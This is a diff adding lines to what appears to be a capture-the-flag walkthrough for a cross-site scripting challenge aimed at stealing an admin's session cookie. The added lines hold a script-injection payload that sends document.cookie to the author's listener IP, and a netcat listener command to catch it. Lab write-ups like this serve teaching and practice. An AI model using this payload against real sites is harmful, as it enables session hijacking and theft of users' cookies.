@@ -9,3 +9,7 @@ replace the webhook.site link with your own instance of webhook, and put the fol
 wait 2 minuites and look on webhook, you will see the admin's cookie
 (make sure you have made an account first and are logged in)
 
+
+This should of worked, but this challenge was garbage, so i tried another method and it worked eventualy, replace the ip with your own IP (not the machines one)
+</p><script>window.location = 'http://10.9.42.1/page?param=' + document.cookie </script><p>
+sudo nc -lvnp 80
